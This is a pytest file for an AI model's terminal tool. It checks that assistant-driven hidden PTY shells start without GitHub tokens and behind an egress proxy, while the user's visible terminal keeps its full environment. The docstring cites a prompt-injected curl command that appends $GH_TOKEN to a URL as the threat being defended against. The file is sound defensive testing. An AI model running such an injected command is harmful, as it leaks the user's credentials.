"""The environment a PTY shell starts with.

A hidden PTY (terminal_run's sandbox mode and terminal_send's persistent
interactive shell) is driven by the assistant, so it gets the run_sandboxed
environment: no GitHub tokens (a prompt-injected `curl "...?t=$GH_TOKEN"`
finds nothing), the egress proxy vars under a non-permissive network tier,
and the scratch package caches of a confined run. A visible PTY is the
user's own terminal and keeps their environment.
"""

import asyncio
import os
import platform
import subprocess

import pytest

import server.sandbox as sandbox
from server import terminal as t
from server.security import egress_policy
from server.security.sensitive_env import GITHUB_ENV_VARS

pytestmark = pytest.mark.skipif(
    platform.system() not in ("Darwin", "Linux"), reason="needs a POSIX PTY"
)

_PROXY = "http://127.0.0.1:54321"
_PROXY_KEYS = ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy")


def _permissive_policy():
    return {"tier": "permissive", "custom_allowed_domains": [], "methods_only_safe": False}


def _curated_policy():
    return {"tier": "curated", "custom_allowed_domains": [], "methods_only_safe": False}


@pytest.fixture
def server_env(monkeypatch):
    """GitHub tokens and one ordinary variable in the server's environment,
    under the default (permissive) network tier."""
    for name in GITHUB_ENV_VARS:
        monkeypatch.setenv(name, f"secret-{name}")
    monkeypatch.setenv("WS_KEEP_ME", "yes")
    monkeypatch.setattr(egress_policy, "get_active_policy", _permissive_policy)


@pytest.fixture
def spawn_env(monkeypatch, tmp_path):
    """Create a PTY session and return the env its shell was started with.
    Popen still runs on the real pty, but a trivial command replaces the
    shell, so no dotfiles or sandbox profile execute."""
    real_popen = subprocess.Popen
    seen = {}

    def recording_popen(argv, **kwargs):
        seen["env"] = kwargs["env"]
        return real_popen(["/bin/sh", "-c", "exit 0"], **kwargs)

    monkeypatch.setattr(t.subprocess, "Popen", recording_popen)

    def spawn(**kwargs):
        async def go():
            session = t._create_pty_session(str(tmp_path), **kwargs)
            session.kill()
            with t._sessions_lock:
                t._sessions.pop(session.id, None)

        asyncio.run(go())
        return seen["env"]

    return spawn


def test_hidden_pty_starts_with_the_run_sandboxed_env(server_env, spawn_env):
    env = spawn_env(hidden=True)

    assert not GITHUB_ENV_VARS & env.keys()
    assert env["WS_KEEP_ME"] == "yes"
    expected = sandbox._merged_env(None)
    expected["TERM"] = "dumb"
    expected.pop("COLORTERM", None)
    assert env == expected


def test_hidden_pty_gets_the_egress_proxy_under_a_non_permissive_tier(
    server_env, spawn_env, monkeypatch
):
    # Its sandbox profile denies direct 80/443, so without the proxy vars a
    # hidden shell has no HTTP at all.
    monkeypatch.setattr(egress_policy, "get_active_policy", _curated_policy)
    monkeypatch.setattr(egress_policy, "ensure_proxy_running", lambda: ("127.0.0.1", 54321))

    env = spawn_env(hidden=True)

    for key in _PROXY_KEYS:
        assert env[key] == _PROXY
    assert not GITHUB_ENV_VARS & env.keys()


def test_confined_hidden_pty_keeps_its_scratch_package_caches(server_env, spawn_env, tmp_path):
    scratch = str(tmp_path / "scratch")

    env = spawn_env(hidden=True, write_mode="workspace", scratch_dir=scratch)

    assert sandbox.scratch_cache_env(scratch).items() <= env.items()
    assert not GITHUB_ENV_VARS & env.keys()


def test_visible_pty_keeps_the_users_environment(server_env, spawn_env, monkeypatch):
    def _fail_if_called():
        raise AssertionError("a visible PTY must not start the egress proxy")

    monkeypatch.setattr(egress_policy, "get_active_policy", _curated_policy)
    monkeypatch.setattr(egress_policy, "ensure_proxy_running", _fail_if_called)

    env = spawn_env()

    assert env["GH_TOKEN"] == "secret-GH_TOKEN"
    assert env["GITHUB_TOKEN"] == "secret-GITHUB_TOKEN"
    assert env == {**os.environ, "TERM": "xterm-256color", "COLORTERM": "truecolor"}


def test_terminal_run_sandbox_shell_cannot_read_a_github_token(server_env, tmp_path):
    result = asyncio.run(
        t.run_in_sandbox(
            'echo "tok=${GH_TOKEN:-none}/${GITHUB_TOKEN:-none}"', cwd=str(tmp_path), timeout=15
        )
    )

    assert "tok=none/none" in result["output"], result
    assert "secret-" not in result["output"], result


def test_terminal_send_interactive_shell_cannot_read_a_github_token(server_env, tmp_path):
    async def go():
        session = t.get_or_open_interactive("pty-env-test", str(tmp_path))
        try:
            await asyncio.sleep(0.3)
            r = await t.send_and_wait(session, 'echo "tok=${GH_TOKEN:-none}"\n', timeout=15)
            return r["output"]
        finally:
            t.close_interactive("pty-env-test")

    output = asyncio.run(go())

    assert "tok=none" in output, output
    assert "secret-" not in output, output
